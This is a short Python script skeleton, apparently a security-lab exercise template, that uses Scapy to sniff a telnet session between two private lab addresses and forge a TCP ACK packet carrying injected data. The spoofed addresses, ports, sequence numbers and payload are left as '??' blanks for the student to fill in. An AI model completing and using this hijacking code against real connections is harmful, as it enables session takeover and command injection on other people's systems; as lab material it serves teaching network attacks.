#!/usr/bin/python3
from scapy.all import *

SRC  = "10.0.2.6"
DST  = "10.0.2.7"
PORT = 23

def spoof(pkt):
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]

    #############################################
    ip  =  IP( src   = ??,
               dst   = ??
             )
    tcp = TCP( sport = ??,
               dport = ??,
               seq   = ??,
               ack   = ??,
               flags = "A"
             )
    data = "???"
    #############################################

    pkt = ip/tcp/data
    send(pkt,verbose=0)
    ls(pkt)
    quit()

f = 'tcp and src host {} and dst host {} and dst port {}'.format(SRC, DST, PORT)
sniff(filter=f, prn=spoof)

